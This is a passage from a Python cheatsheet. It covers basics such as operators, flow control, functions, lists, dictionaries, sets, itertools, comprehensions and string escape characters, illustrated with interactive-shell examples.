Methods Checking Whether a Key or Value Exists in a Dictionary The get() Method The setdefault() Method Pretty Printing Merge two dictionaries   sets  Initializing a set sets: unordered collections of unique elements set add() and update() set remove() and discard() set union() set intersection set difference set symetric_difference   itertools Module  accumulate() combinations() combinations_with_replacement() count() cycle() chain() compress() dropwhile() filterfalse() groupby() islice() permutations() product() repeat() starmap() takewhile() tee() zip_longest()   Comprehensions  List comprehension Set comprehension Dict comprehension   Manipulating Strings  Escape Characters Raw Strings Multiline Strings with Triple Quotes Indexing and Slicing Strings The in and not in Operators with Strings The in and not in Operators with list The upper(), lower(), isupper(), and islower() String Methods The isX String Methods The startswith() and endswith() String Methods The join() and split() String Methods Justifying Text with rjust(), ljust(), and center() Removing Whitespace with strip(), rstrip(), and lstrip() Copying and Pasting Strings with the pyperclip Module (need pip install)   String Formatting  % operator String Formatting (str.format) Lazy string formatting Formatted String Literals or f-strings (Python 3.6+) Template Strings   Regular Expressions  Matching Regex Objects Grouping with Parentheses Matching Multiple Groups with the Pipe Optional Matching with the Question Mark Matching Zero or More with the Star Matching One or More with the Plus Matching Specific Repetitions with Curly Brackets Greedy and Nongreedy Matching The findall() Method Making Your Own Character Classes The Caret and Dollar Sign Characters The Wildcard Character Matching Everything with Dot-Star Matching Newlines with the Dot Character Review of Regex Symbols Case-Insensitive Matching Substituting Strings with the sub() Method Managing Complex Regexes   Handling File and Directory Paths  Backslash on Windows and Forward Slash on OS X and Linux The Current Working Directory Creating New Folders Absolute vs. Relative Paths Handling Absolute and Relative Paths Checking Path Validity Finding File Sizes and Folder Contents Copying Files and Folders Moving and Renaming Files and Folders Permanently Deleting Files and Folders Safe Deletes with the send2trash Module Walking a Directory Tree   Reading and Writing Files  The File Reading/Writing Process Opening and reading files with the open() function Writing to Files Saving Variables with the shelve Module Saving Variables with the pprint.pformat() Function Reading ZIP Files Extracting from ZIP Files Creating and Adding to ZIP Files   JSON, YAML and configuration files  JSON YAML Anyconfig   Debugging  Raising Exceptions Getting the Traceback as a String Assertions Logging Logging Levels Disabling Logging Logging to a File   Lambda Functions Ternary Conditional Operator args and kwargs  Things to Remember(args) Things to Remember(kwargs)   Context Manager  with statement Writing your own contextmanager using generator syntax   __main__ Top-level script environment  Advantages   setup.py Dataclasses  Features Default values Type hints   Virtual Environment  virtualenv poetry pipenv anaconda      The Zen of Python From the PEP 20 -- The Zen of Python:  Long time Pythoneer Tim Peters succinctly channels the BDFL's guiding principles for Python's design into 20 aphorisms, only 19 of which have been written down.  >>> import this The Zen of Python, by Tim Peters  Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! Return to the Top Python Basics Math Operators From Highest to Lowest precedence:    Operators Operation Example     ** Exponent 2 ** 3 = 8   % Modulus/Remainder 22 % 8 = 6   // Integer division 22 // 8 = 2   / Division 22 / 8 = 2.75   * Multiplication 3 * 3 = 9   - Subtraction 5 - 2 = 3   + Addition 2 + 2 = 4    Examples of expressions in the interactive shell: >>> 2 + 3 * 6 20 >>> (2 + 3) * 6 30 >>> 2 ** 8 256 >>> 23 // 7 3 >>> 23 % 7 2 >>> (5 - 1) * ((7 + 1) / (3 - 1)) 16.0 Return to the Top Data Types    Data Type Examples     Integers -2, -1, 0, 1, 2, 3, 4, 5   Floating-point numbers -1.25, -1.0, --0.5, 0.0, 0.5, 1.0, 1.25   Strings 'a', 'aa', 'aaa', 'Hello!', '11 cats'    Return to the Top String Concatenation and Replication String concatenation: >>> 'Alice' 'Bob' 'AliceBob' Note: Avoid + operator for string concatenation. Prefer string formatting. String Replication: >>> 'Alice' * 5 'AliceAliceAliceAliceAlice' Return to the Top Variables You can name a variable anything as long as it obeys the following rules:  It can be only one word. It can use only letters, numbers, and the underscore (_) character. It can’t begin with a number. Variable name starting with an underscore (_) are considered as ""unuseful`.  Example: >>> spam = 'Hello' >>> spam 'Hello' >>> _spam = 'Hello' _spam should not be used again in the code. Return to the Top Comments Inline comment: # This is a comment Multiline comment: # This is a # multiline comment Code with a comment: a = 1  # initialization Please note the two spaces in front of the comment. Function docstring: def foo():     """"""     This is a function docstring     You can also use:     ''' Function Docstring '''     """""" Return to the Top The print() Function >>> print('Hello world!') Hello world! >>> a = 1 >>> print('Hello world!', a) Hello world! 1 Return to the Top The input() Function Example Code: >>> print('What is your name?')   # ask for their name >>> myName = input() >>> print('It is good to meet you, {}'.format(myName)) What is your name? Al It is good to meet you, Al Return to the Top The len() Function Evaluates to the integer value of the number of characters in a string: >>> len('hello') 5 Note: test of emptiness of strings, lists, dictionary, etc, should not use len, but prefer direct boolean evaluation. >>> a = [1, 2, 3] >>> if a: >>>     print(""the list is not empty!"") Return to the Top The str(), int(), and float() Functions Integer to String or Float: >>> str(29) '29' >>> print('I am {} years old.'.format(str(29))) I am 29 years old. >>> str(-3.14) '-3.14' Float to Integer: >>> int(7.7) 7 >>> int(7.7) + 1 8 Return to the Top Flow Control Comparison Operators    Operator Meaning     == Equal to   != Not equal to   < Less than   > Greater Than   <= Less than or Equal to   >= Greater than or Equal to    These operators evaluate to True or False depending on the values you give them. Examples: >>> 42 == 42 True >>> 40 == 42 False >>> 'hello' == 'hello' True >>> 'hello' == 'Hello' False >>> 'dog' != 'cat' True >>> 42 == 42.0 True >>> 42 == '42' False Boolean evaluation Never use == or != operator to evaluate boolean operation. Use the is or is not operators, or use implicit boolean evaluation. NO (even if they are valid Python): >>> True == True True >>> True != False True YES (even if they are valid Python): >>> True is True True >>> True is not False True These statements are equivalent: >>> if a is True: >>>    pass >>> if a is not False: >>>    pass >>> if a: >>>    pass And these as well: >>> if a is False: >>>    pass >>> if a is not True: >>>    pass >>> if not a: >>>    pass Return to the Top Boolean Operators There are three Boolean operators: and, or, and not. The and Operator’s Truth Table:    Expression Evaluates to     True and True True   True and False False   False and True False   False and False False    The or Operator’s Truth Table:    Expression Evaluates to     True or True True   True or False True   False or True True   False or False False    The not Operator’s Truth Table:    Expression Evaluates to     not True False   not False True    Return to the Top Mixing Boolean and Comparison Operators >>> (4 < 5) and (5 < 6) True >>> (4 < 5) and (9 < 6) False >>> (1 == 2) or (2 == 2) True You can also use multiple Boolean operators in an expression, along with the comparison operators: >>> 2 + 2 == 4 and not 2 + 2 == 5 and 2 * 2 == 2 + 2 True Return to the Top if Statements if name == 'Alice':     print('Hi, Alice.') Return to the Top else Statements name = 'Bob' if name == 'Alice':     print('Hi, Alice.') else:     print('Hello, stranger.') Return to the Top elif Statements name = 'Bob' age = 5 if name == 'Alice':     print('Hi, Alice.') elif age < 12:     print('You are not Alice, kiddo.') name = 'Bob' age = 30 if name == 'Alice':     print('Hi, Alice.') elif age < 12:     print('You are not Alice, kiddo.') else:     print('You are neither Alice nor a little kid.') Return to the Top while Loop Statements spam = 0 while spam < 5:     print('Hello, world.')     spam = spam + 1 Return to the Top break Statements If the execution reaches a break statement, it immediately exits the while loop’s clause: while True:     print('Please type your name.')     name = input()     if name == 'your name':         break print('Thank you!') Return to the Top continue Statements When the program execution reaches a continue statement, the program execution immediately jumps back to the start of the loop. while True:     print('Who are you?')     name = input()     if name != 'Joe':         continue     print('Hello, Joe. What is the password? (It is a fish.)')     password = input()     if password == 'swordfish':         break print('Access granted.') Return to the Top for Loops and the range() Function >>> print('My name is') >>> for i in range(5): >>>     print('Jimmy Five Times ({})'.format(str(i))) My name is Jimmy Five Times (0) Jimmy Five Times (1) Jimmy Five Times (2) Jimmy Five Times (3) Jimmy Five Times (4) The range() function can also be called with three arguments. The first two arguments will be the start and stop values, and the third will be the step argument. The step is the amount that the variable is increased by after each iteration. >>> for i in range(0, 10, 2): >>>    print(i) 0 2 4 6 8 You can even use a negative number for the step argument to make the for loop count down instead of up. >>> for i in range(5, -1, -1): >>>     print(i) 5 4 3 2 1 0 For else statement This allows to specify a statement to execute in case of the full loop has been executed. Only useful when a break condition can occur in the loop: >>> for i in [1, 2, 3, 4, 5]: >>>    if i == 3: >>>        break >>> else: >>>    print(""only executed when no item of the list is equal to 3"") Return to the Top Importing Modules import random for i in range(5):     print(random.randint(1, 10)) import random, sys, os, math from random import * Return to the Top Ending a Program Early with sys.exit() import sys  while True:     print('Type exit to exit.')     response = input()     if response == 'exit':         sys.exit()     print('You typed {}.'.format(response)) Return to the Top Functions >>> def hello(name): >>>     print('Hello {}'.format(name)) >>> >>> hello('Alice') >>> hello('Bob') Hello Alice Hello Bob Return to the Top Return Values and return Statements When creating a function using the def statement, you can specify what the return value should be with a return statement. A return statement consists of the following:   The return keyword.   The value or expression that the function should return.   import random def getAnswer(answerNumber):     if answerNumber == 1:         return 'It is certain'     elif answerNumber == 2:         return 'It is decidedly so'     elif answerNumber == 3:         return 'Yes'     elif answerNumber == 4:         return 'Reply hazy try again'     elif answerNumber == 5:         return 'Ask again later'     elif answerNumber == 6:         return 'Concentrate and ask again'     elif answerNumber == 7:         return 'My reply is no'     elif answerNumber == 8:         return 'Outlook not so good'     elif answerNumber == 9:         return 'Very doubtful'  r = random.randint(1, 9) fortune = getAnswer(r) print(fortune) Return to the Top The None Value >>> spam = print('Hello!') Hello! >>> spam is None True Note: never compare to None with the == operator. Always use is. Return to the Top Keyword Arguments and print() >>> print('Hello', end='') >>> print('World') HelloWorld >>> print('cats', 'dogs', 'mice') cats dogs mice >>> print('cats', 'dogs', 'mice', sep=',') cats,dogs,mice Return to the Top Local and Global Scope   Code in the global scope cannot use any local variables.   However, a local scope can access global variables.   Code in a function’s local scope cannot use variables in any other local scope.   You can use the same name for different variables if they are in different scopes. That is, there can be a local variable named spam and a global variable also named spam.   Return to the Top The global Statement If you need to modify a global variable from within a function, use the global statement: >>> def spam(): >>>     global eggs >>>     eggs = 'spam' >>> >>> eggs = 'global' >>> spam() >>> print(eggs) spam There are four rules to tell whether a variable is in a local scope or global scope:   If a variable is being used in the global scope (that is, outside of all functions), then it is always a global variable.   If there is a global statement for that variable in a function, it is a global variable.   Otherwise, if the variable is used in an assignment statement in the function, it is a local variable.   But if the variable is not used in an assignment statement, it is a global variable.   Return to the Top Exception Handling Basic exception handling >>> def spam(divideBy): >>>     try: >>>         return 42 / divideBy >>>     except ZeroDivisionError as e: >>>         print('Error: Invalid argument: {}'.format(e)) >>> >>> print(spam(2)) >>> print(spam(12)) >>> print(spam(0)) >>> print(spam(1)) 21.0 3.5 Error: Invalid argument: division by zero None 42.0 Return to the Top Final code in exception handling Code inside the finally section is always executed, no matter if an exception has been raised or not, and even if an exception is not caught. >>> def spam(divideBy): >>>     try: >>>         return 42 / divideBy >>>     except ZeroDivisionError as e: >>>         print('Error: Invalid argument: {}'.format(e)) >>>     finally: >>>         print(""-- division finished --"") >>> print(spam(2)) -- division finished -- 21.0 >>> print(spam(12)) -- division finished -- 3.5 >>> print(spam(0)) Error: Invalid Argument division by zero -- division finished -- None >>> print(spam(1)) -- division finished -- 42.0 Return to the Top Lists >>> spam = ['cat', 'bat', 'rat', 'elephant']  >>> spam ['cat', 'bat', 'rat', 'elephant'] Return to the Top Getting Individual Values in a List with Indexes >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> spam[0] 'cat' >>> spam[1] 'bat' >>> spam[2] 'rat' >>> spam[3] 'elephant' Return to the Top Negative Indexes >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> spam[-1] 'elephant' >>> spam[-3] 'bat' >>> 'The {} is afraid of the {}.'.format(spam[-1], spam[-3]) 'The elephant is afraid of the bat.' Return to the Top Getting Sublists with Slices >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> spam[0:4] ['cat', 'bat', 'rat', 'elephant'] >>> spam[1:3] ['bat', 'rat'] >>> spam[0:-1] ['cat', 'bat', 'rat'] >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> spam[:2] ['cat', 'bat'] >>> spam[1:] ['bat', 'rat', 'elephant'] Slicing the complete list will perform a copy: >>> spam2 = spam[:] ['cat', 'bat', 'rat', 'elephant'] >>> spam.append('dog') >>> spam ['cat', 'bat', 'rat', 'elephant', 'dog'] >>> spam2 ['cat', 'bat', 'rat', 'elephant'] Return to the Top Getting a List’s Length with len() >>> spam = ['cat', 'dog', 'moose'] >>> len(spam) 3 Return to the Top Changing Values in a List with Indexes >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> spam[1] = 'aardvark'  >>> spam ['cat', 'aardvark', 'rat', 'elephant']  >>> spam[2] = spam[1]  >>> spam ['cat', 'aardvark', 'aardvark', 'elephant']  >>> spam[-1] = 12345  >>> spam ['cat', 'aardvark', 'aardvark', 12345] Return to the Top List Concatenation and List Replication >>> [1, 2, 3] + ['A', 'B', 'C'] [1, 2, 3, 'A', 'B', 'C']  >>> ['X', 'Y', 'Z'] * 3 ['X', 'Y', 'Z', 'X', 'Y', 'Z', 'X', 'Y', 'Z']  >>> spam = [1, 2, 3]  >>> spam = spam + ['A', 'B', 'C']  >>> spam [1, 2, 3, 'A', 'B', 'C'] Return to the Top Removing Values from Lists with del Statements >>> spam = ['cat', 'bat', 'rat', 'elephant'] >>> del spam[2] >>> spam ['cat', 'bat', 'elephant'] >>> del spam[2] >>> spam ['cat', 'bat'] Return to the Top Using for Loops with Lists >>> supplies = ['pens', 'staplers', 'flame-throwers', 'binders'] >>> for i, supply in enumerate(supplies): >>>     print('Index {} in supplies is: {}'.format(str(i), supply)) Index 0 in supplies is: pens Index 1 in supplies is: staplers Index 2 in supplies is: flame-throwers Index 3 in supplies is: binders Return to the Top Looping Through Multiple Lists with zip() >>> name = ['Pete', 'John', 'Elizabeth'] >>> age = [6, 23, 44] >>> for n, a in zip(name, age): >>>     print('{} is {} years old'.format(n, a)) Pete is 6 years old John is 23 years old Elizabeth is 44 years old The in and not in Operators >>> 'howdy' in ['hello', 'hi', 'howdy', 'heyas'] True >>> spam = ['hello', 'hi', 'howdy', 'heyas'] >>> 'cat' in spam False >>> 'howdy' not in spam False >>> 'cat' not in spam True Return to the Top The Multiple Assignment Trick The multiple assignment trick is a shortcut that lets you assign multiple variables with the values in a list in one line of code. So instead of doing this: >>> cat = ['fat', 'orange', 'loud']  >>> size = cat[0]  >>> color = cat[1]  >>> disposition = cat[2] You could type this line of code: >>> cat = ['fat', 'orange', 'loud']  >>> size, color, disposition = cat The multiple assignment trick can also be used to swap the values in two variables: >>> a, b = 'Alice', 'Bob' >>> a, b = b, a >>> print(a) 'Bob' >>> print(b) 'Alice' Return to the Top Augmented Assignment Operators    Operator Equivalent     spam += 1 spam = spam + 1   spam -= 1 spam = spam - 1   spam *= 1 spam = spam * 1   spam /= 1 spam = spam / 1   spam %= 1 spam = spam % 1    Examples: >>> spam = 'Hello' >>> spam += ' world!' >>> spam 'Hello world!'  >>> bacon = ['Zophie'] >>> bacon *= 3 >>> bacon ['Zophie', 'Zophie', 'Zophie'] Return to the Top Finding a Value in a List with the index() Method >>> spam = ['Zophie', 'Pooka', 'Fat-tail', 'Pooka']  >>> spam.index('Pooka') 1 Return to the Top Adding Values to Lists with the append() and insert() Methods append(): >>> spam = ['cat', 'dog', 'bat']  >>> spam.append('moose')  >>> spam ['cat', 'dog', 'bat', 'moose'] insert(): >>> spam = ['cat', 'dog', 'bat']  >>> spam.insert(1, 'chicken')  >>> spam ['cat', 'chicken', 'dog', 'bat'] Return to the Top Removing Values from Lists with remove() >>> spam = ['cat', 'bat', 'rat', 'elephant']  >>> spam.remove('bat')  >>> spam ['cat', 'rat', 'elephant'] If the value appears multiple times in the list, only the first instance of the value will be removed. Return to the Top Removing Values from Lists with pop() >>> spam = ['cat', 'bat', 'rat', 'elephant']  >>> spam.pop() 'elephant'  >>> spam ['cat', 'bat', 'rat']  >>> spam.pop(0) 'cat'  >>> spam ['bat', 'rat'] Return to the Top Sorting the Values in a List with the sort() Method >>> spam = [2, 5, 3.14, 1, -7] >>> spam.sort() >>> spam [-7, 1, 2, 3.14, 5] >>> spam = ['ants', 'cats', 'dogs', 'badgers', 'elephants'] >>> spam.sort() >>> spam ['ants', 'badgers', 'cats', 'dogs', 'elephants'] You can also pass True for the reverse keyword argument to have sort() sort the values in reverse order: >>> spam.sort(reverse=True) >>> spam ['elephants', 'dogs', 'cats', 'badgers', 'ants'] If you need to sort the values in regular alphabetical order, pass str. lower for the key keyword argument in the sort() method call: >>> spam = ['a', 'z', 'A', 'Z'] >>> spam.sort(key=str.lower) >>> spam ['a', 'A', 'z', 'Z'] You can use the built-in function sorted to return a new list: >>> spam = ['ants', 'cats', 'dogs', 'badgers', 'elephants'] >>> sorted(spam) ['ants', 'badgers', 'cats', 'dogs', 'elephants'] Return to the Top Tuple Data Type >>> eggs = ('hello', 42, 0.5) >>> eggs[0] 'hello' >>> eggs[1:3] (42, 0.5) >>> len(eggs) 3 The main way that tuples are different from lists is that tuples, like strings, are immutable. Return to the Top Converting Types with the list() and tuple() Functions >>> tuple(['cat', 'dog', 5]) ('cat', 'dog', 5) >>> list(('cat', 'dog', 5)) ['cat', 'dog', 5] >>> list('hello') ['h', 'e', 'l', 'l', 'o'] Return to the Top Dictionaries and Structuring Data Example Dictionary: myCat = {'size': 'fat', 'color': 'gray', 'disposition': 'loud'} Return to the Top The keys(), values(), and items() Methods values(): >>> spam = {'color': 'red', 'age': 42} >>> for v in spam.values(): >>>     print(v) red 42 keys(): >>> for k in spam.keys(): >>>     print(k) color age items(): >>> for i in spam.items(): >>>     print(i) ('color', 'red') ('age', 42) Using the keys(), values(), and items() methods, a for loop can iterate over the keys, values, or key-value pairs in a dictionary, respectively. >>> spam = {'color': 'red', 'age': 42} >>> >>> for k, v in spam.items(): >>>     print('Key: {} Value: {}'.format(k, str(v))) Key: age Value: 42 Key: color Value: red Return to the Top Checking Whether a Key or Value Exists in a Dictionary >>> spam = {'name': 'Zophie', 'age': 7} >>> 'name' in spam.keys() True >>> 'Zophie' in spam.values() True >>> # You can omit the call to keys() when checking for a key >>> 'color' in spam False >>> 'color' not in spam True Return to the Top The get() Method Get has two parameters: key and default value if the key did not exist >>> picnic_items = {'apples': 5, 'cups': 2}  >>> 'I am bringing {} cups.'.format(str(picnic_items.get('cups', 0))) 'I am bringing 2 cups.' >>> 'I am bringing {} eggs.'.format(str(picnic_items.get('eggs', 0))) 'I am bringing 0 eggs.' Return to the Top The setdefault() Method Let's consider this code: spam = {'name': 'Pooka', 'age': 5}  if 'color' not in spam:     spam['color'] = 'black' Using setdefault we could write the same code more succinctly: >>> spam = {'name': 'Pooka', 'age': 5} >>> spam.setdefault('color', 'black') 'black' >>> spam {'color': 'black', 'age': 5, 'name': 'Pooka'} >>> spam.setdefault('color', 'white') 'black' >>> spam {'color': 'black', 'age': 5, 'name': 'Pooka'} Return to the Top Pretty Printing >>> import pprint >>> >>> message = 'It was a bright cold day in April, and the clocks were striking >>> thirteen.' >>> count = {} >>> >>> for character in message: >>>     count.setdefault(character, 0) >>>     count[character] = count[character] + 1 >>> >>> pprint.pprint(count) {' ': 13,  ',': 1,  '.': 1,  'A': 1,  'I': 1,  'a': 4,  'b': 1,  'c': 3,  'd': 3,  'e': 5,  'g': 2,  'h': 3,  'i': 6,  'k': 2,  'l': 3,  'n': 4,  'o': 2,  'p': 1,  'r': 5,  's': 3,  't': 6,  'w': 2,  'y': 1} Return to the Top Merge two dictionaries # in Python 3.5+: >>> x = {'a': 1, 'b': 2} >>> y = {'b': 3, 'c': 4} >>> z = {**x, **y} >>> z {'c': 4, 'a': 1, 'b': 3}  # in Python 2.7 >>> z = dict(x, **y) >>> z {'c': 4, 'a': 1, 'b': 3} sets From the Python 3 documentation  A set is an unordered collection with no duplicate elements. Basic uses include membership testing and eliminating duplicate entries. Set objects also support mathematical operations like union, intersection, difference, and symmetric difference.  Initializing a set There are two ways to create sets: using curly braces {} and the built-in function set() >>> s = {1, 2, 3} >>> s = set([1, 2, 3]) When creating an empty set, be sure to not use the curly braces {} or you will get an empty dictionary instead. >>> s = {} >>> type(s) <class 'dict'> sets: unordered collections of unique elements A set automatically remove all the duplicate values. >>> s = {1, 2, 3, 2, 3, 4} >>> s {1, 2, 3, 4} And as an unordered data type, they can't be indexed. >>> s = {1, 2, 3} >>> s[0] Traceback (most recent call last):   File ""<stdin>"", line 1, in <module> TypeError: 'set' object does not support indexing >>> set add() and update() Using the add() method we can add a single element to the set. >>> s = {1, 2, 3} >>> s.add(4) >>> s {1, 2, 3, 4} And with update(), multiple ones . >>> s = {1, 2, 3} >>> s.update([2, 3, 4, 5, 6]) >>> s {1, 2, 3, 4, 5, 6}  # remember, sets automatically remove duplicates set remove() and discard() Both methods will remove an element from the set, but remove() will raise a key error if the value doesn't exist. >>> s = {1, 2, 3} >>> s.remove(3) >>> s {1, 2} >>> s.remove(3) Traceback (most recent call last):   File ""<stdin>"", line 1, in <module> KeyError: 3 discard() won't raise any errors. >>> s = {1, 2, 3} >>> s.discard(3) >>> s {1, 2} >>> s.discard(3) >>> set union() union() or | will create a new set that contains all the elements from the sets provided. >>> s1 = {1, 2, 3} >>> s2 = {3, 4, 5} >>> s1.union(s2)  # or 's1 | s2' {1, 2, 3, 4, 5} set intersection intersection or & will return a set containing only the elements that are common to all of them. >>> s1 = {1, 2, 3} >>> s2 = {2, 3, 4} >>> s3 = {3, 4, 5} >>> s1.intersection(s2, s3)  # or 's1 & s2 & s3' {3} set difference difference or - will return only the elements that are unique to the first set (invoked set). >>> s1 = {1, 2, 3} >>> s2 = {2, 3, 4} >>> s1.difference(s2)  # or 's1 - s2' {1} >>> s2.difference(s1) # or 's2 - s1' {4} set symetric_difference symetric_difference or ^ will return all the elements that are not common between them. >>> s1 = {1, 2, 3} >>> s2 = {2, 3, 4} >>> s1.symmetric_difference(s2)  # or 's1 ^ s2' {1, 4} Return to the Top itertools Module The itertools module is a collection of tools intended to be fast and use memory efficiently when handling iterators (like lists or dictionaries). From the official Python 3.x documentation:  The module standardizes a core set of fast, memory efficient tools that are useful by themselves or in combination. Together, they form an “iterator algebra” making it possible to construct specialized tools succinctly and efficiently in pure Python.  The itertools module comes in the standard library and must be imported. The operator module will also be used. This module is not necessary when using itertools, but needed for some of the examples below. Return to the Top accumulate() Makes an iterator that returns the results of a function. itertools.accumulate(iterable[, func]) Example: >>> data = [1, 2, 3, 4, 5] >>> result = itertools.accumulate(data, operator.mul) >>> for each in result: >>>    print(each) 1 2 6 24 120 The operator.mul takes two numbers and multiplies them: operator.mul(1, 2) 2 operator.mul(2, 3) 6 operator.mul(6, 4) 24 operator.mul(24, 5) 120 Passing a function is optional: >>> data = [5, 2, 6, 4, 5, 9, 1] >>> result = itertools.accumulate(data) >>> for each in result: >>>    print(each) 5 7 13 17 22 31 32 If no function is designated the items will be summed: 5 5 + 2 = 7 7 + 6 = 13 13 + 4 = 17 17 + 5 = 22 22 + 9 = 31 31 + 1 = 32 Return to the Top combinations() Takes an iterable and a integer. This will create all the unique combination that have r members. itertools.combinations(iterable, r) Example: >>> shapes = ['circle', 'triangle', 'square',] >>> result = itertools.combinations(shapes, 2) >>> for each in result: >>>    print(each) ('circle', 'triangle') ('circle', 'square') ('triangle', 'square') Return to the Top combinations_with_replacement() Just like combinations(), but allows individual elements to be repeated more than once. itertools.combinations_with_replacement(iterable, r) Example: >>> shapes = ['circle', 'triangle', 'square'] >>> result = itertools.combinations_with_replacement(shapes, 2) >>> for each in result: >>>    print(each) ('circle', 'circle') ('circle', 'triangle') ('circle', 'square') ('triangle', 'triangle') ('triangle', 'square') ('square', 'square') Return to the Top count() Makes an iterator that returns evenly spaced values starting with number start. itertools.count(start=0, step=1) Example: >>> for i in itertools.count(10,3): >>>    print(i) >>>    if i > 20: >>>        break 10 13 16 19 22 Return to the Top cycle() This function cycles through an iterator endlessly. itertools.cycle(iterable) Example: >>> colors = ['red', 'orange', 'yellow', 'green', 'blue', 'violet'] >>> for color in itertools.cycle(colors): >>>    print(color) red orange yellow green blue violet red orange When reached the end of the iterable it start over again from the beginning. Return to the Top chain() Take a series of iterables and return them as one long iterable. itertools.chain(*iterables) Example: >>> colors = ['red', 'orange', 'yellow', 'green', 'blue'] >>> shapes = ['circle', 'triangle', 'square', 'pentagon'] >>> result = itertools.chain(colors, shapes) >>> for each in result: >>>    print(each) red orange yellow green blue circle triangle square pentagon Return to the Top compress() Filters one iterable with another. itertools.compress(data, selectors) Example: >>> shapes = ['circle', 'triangle', 'square', 'pentagon'] >>> selections = [True, False, True, False] >>> result = itertools.compress(shapes, selections) >>> for each in result: >>>    print(each) circle square Return to the Top dropwhile() Make an iterator that drops elements from the iterable as long as the predicate is true; afterwards, returns every element. itertools.dropwhile(predicate, iterable) Example: >>> data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1] >>> result = itertools.dropwhile(lambda x: x<5, data) >>> for each in result: >>>    print(each) 5 6 7 8 9 10 1 Return to the Top filterfalse() Makes an iterator that filters elements from iterable returning only those for which the predicate is False. itertools.filterfalse(predicate, iterable) Example: >>> data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1] >>> result = itertools.filterfalse(lambda x: x<5, data) >>> for each in result: >>>    print(each) 5 6 7 8 9 10 Return to the Top groupby() Simply put, this function groups things together. itertools.groupby(iterable, key=None) Example: >>> robots = [{     'name': 'blaster',     'faction': 'autobot' }, {     'name': 'galvatron',     'faction': 'decepticon' }, {     'name': 'jazz',     'faction': 'autobot' }, {     'name': 'metroplex',     'faction': 'autobot' }, {     'name': 'megatron',     'faction': 'decepticon' }, {     'name': 'starcream',     'faction': 'decepticon' }] >>> for key, group in itertools.groupby(robots, key=lambda x: x['faction']): >>>    print(key) >>>    print(list(group)) autobot [{'name': 'blaster', 'faction': 'autobot'}] decepticon [{'name': 'galvatron', 'faction': 'decepticon'}] autobot [{'name': 'jazz', 'faction': 'autobot'}, {'name': 'metroplex', 'faction': 'autobot'}] decepticon [{'name': 'megatron', 'faction': 'decepticon'}, {'name': 'starcream', 'faction': 'decepticon'}] Return to the Top islice() This function is very much like slices. This allows you to cut out a piece of an iterable. itertools.islice(iterable, start, stop[, step]) Example: >>> colors = ['red', 'orange', 'yellow', 'green', 'blue',] >>> few_colors = itertools.islice(colors, 2) >>> for each in few_colors: >>>    print(each) red orange Return to the Top permutations() itertools.permutations(iterable, r=None) Example: >>> alpha_data = ['a', 'b', 'c'] >>> result = itertools.permutations(alpha_data) >>> for each in result: >>>    print(each) ('a', 'b', 'c') ('a', 'c', 'b') ('b', 'a', 'c') ('b', 'c', 'a') ('c', 'a', 'b') ('c', 'b', 'a') Return to the Top product() Creates the cartesian products from a series of iterables. >>> num_data = [1, 2, 3] >>> alpha_data = ['a', 'b', 'c'] >>> result = itertools.product(num_data, alpha_data) >>> for each in result:     print(each) (1, 'a') (1, 'b') (1, 'c') (2, 'a') (2, 'b') (2, 'c') (3, 'a') (3, 'b') (3, 'c') Return to the Top repeat() This function will repeat an object over and over again. Unless, there is a times argument. itertools.repeat(object[, times]) Example: >>> for i in itertools.repeat(""spam"", 3):     print(i) spam spam spam Return to the Top starmap() Makes an iterator that computes the function using arguments obtained from the iterable. itertools.starmap(function, iterable) Example: >>> data = [(2, 6), (8, 4), (7, 3)] >>> result = itertools.starmap(operator.mul, data) >>> for each in result: >>>    print(each) 12 32 21 Return to the Top takewhile() The opposite of dropwhile(). Makes an iterator and returns elements from the iterable as long as the predicate is true. itertools.takewhile(predicate, iterable) Example: >>> data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1] >>> result = itertools.takewhile(lambda x: x<5, data) >>> for each in result: >>>    print(each) 1 2 3 4 Return to the Top tee() Return n independent iterators from a single iterable. itertools.tee(iterable, n=2) Example: >>> colors = ['red', 'orange', 'yellow', 'green', 'blue'] >>> alpha_colors, beta_colors = itertools.tee(colors) >>> for each in alpha_colors: >>>    print(each) red orange yellow green blue >>> colors = ['red', 'orange', 'yellow', 'green', 'blue'] >>> alpha_colors, beta_colors = itertools.tee(colors) >>> for each in beta_colors: >>>    print(each) red orange yellow green blue Return to the Top zip_longest() Makes an iterator that aggregates elements from each of the iterables. If the iterables are of uneven length, missing values are filled-in with fillvalue. Iteration continues until the longest iterable is exhausted. itertools.zip_longest(*iterables, fillvalue=None) Example: >>> colors = ['red', 'orange', 'yellow', 'green', 'blue',] >>> data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,] >>> for each in itertools.zip_longest(colors, data, fillvalue=None): >>>    print(each) ('red', 1) ('orange', 2) ('yellow', 3) ('green', 4) ('blue', 5) (None, 6) (None, 7) (None, 8) (None, 9) (None, 10) Return to the Top Comprehensions List comprehension >>> a = [1, 3, 5, 7, 9, 11]  >>> [i - 1 for i in a] [0, 2, 4, 6, 8, 10] Set comprehension >>> b = {""abc"", ""def""} >>> {s.upper() for s in b} {""ABC"", ""DEF""} Dict comprehension >>> c = {'name': 'Pooka', 'age': 5} >>> {v: k for k, v in c.items()} {'Pooka': 'name', 5: 'age'} A List comprehension can be generated from a dictionary: >>> c = {'name': 'Pooka', 'first_name': 'Oooka'} >>> [""{}:{}"".format(k.upper(), v.upper()) for k, v in c.items()] ['NAME:POOKA', 'FIRST_NAME:OOOKA'] Manipulating Strings Escape Characters    Escape character Prints as     \' Single quote   \"" Double quote   \t Tab   \n Newline (line break)   \\ Backslash   \b Backspace   \ooo Octal value   \r Carriage Return    Example: >>> print(""Hello there!\nHow are you?\nI\'m doing fine."") Hello there! How are you? I'm doing fine. Return to the Top Raw Strings A raw string completely ignores all escape characters and prints any backslash that appears in the string. 